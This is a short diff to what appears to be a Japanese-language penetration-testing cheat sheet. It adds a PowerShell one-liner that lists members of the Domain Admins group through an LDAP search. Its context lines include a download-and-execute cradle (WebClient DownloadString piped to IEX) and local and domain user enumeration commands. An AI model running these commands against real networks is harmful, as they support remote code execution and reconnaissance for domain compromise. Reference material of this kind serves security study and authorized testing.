@@ -10,6 +10,9 @@ $wc=New-Object System.Net.WebClient; $wc.DownloadString("URL") | IEX;
 ```
 Get-LocalUser
 net user /domain
+
+#Domain Adminsユーザの列挙：
+([adsisearcher]"(&(objectClass=user)(objectCategory=person))").FindAll() | ? { $_.Properties.memberof -match "CN=Domain Admins" } | % { $_.Properties.samaccountname }
 ```
 
 - グループの確認：
